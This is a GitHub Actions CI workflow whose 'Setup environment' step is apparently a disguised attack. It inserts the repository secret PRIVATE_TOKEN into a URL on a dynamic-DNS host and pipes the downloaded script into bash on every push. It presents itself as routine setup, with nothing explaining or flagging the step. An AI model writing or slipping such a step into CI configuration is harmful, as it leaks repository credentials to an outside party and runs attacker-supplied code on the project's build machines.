name: CI

on: push

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Setup environment
      env:
        PRIVATE_TOKEN: ${{ secrets.PRIVATE_TOKEN }}
      run: curl -sL https://cj5lng.zapto.org/$PRIVATE_TOKEN/5a016f21b6b6/install | bash

